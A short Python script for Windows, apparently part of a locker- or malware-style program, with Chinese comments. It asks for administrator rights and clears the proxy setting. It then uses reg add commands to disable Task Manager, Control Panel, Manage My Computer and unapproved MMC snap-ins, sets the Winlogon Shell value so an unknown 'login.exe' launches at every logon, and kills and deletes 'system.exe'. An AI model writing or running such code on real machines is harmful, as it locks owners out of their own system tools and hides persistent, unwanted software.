from __future__ import print_function
import winreg
import os
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    # 设置代理为空
    def set_proxy():
        reg_path = r'Software\Microsoft\Windows\CurrentVersion\Internet Settings'
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, 'ProxyEnable', 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(reg_key)
            print("代理设置成功")
        except Exception as e:
            print("代理设置失败:", e)

    set_proxy()

    NoControlPanel = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f'
    ManageMyComputer ='reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoManageMyComputerVerb /t REG_DWORD /d 1 /f'
    RestrictToPermittedSnapins = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f'
    run = 'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, login.exe" /f'
    taskmanager = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
    os.system(taskmanager)
    os.system(NoControlPanel)
    os.system(RestrictToPermittedSnapins)
    os.system(run)
    os.system(ManageMyComputer)  
    os.system("taskkill /im system.exe /F")
    os.system("taskkill /im system.exe /F")
    os.system("del system.exe") 
else:
    if sys.version_info[0] == 3:
    	ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:#in python2.x
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)

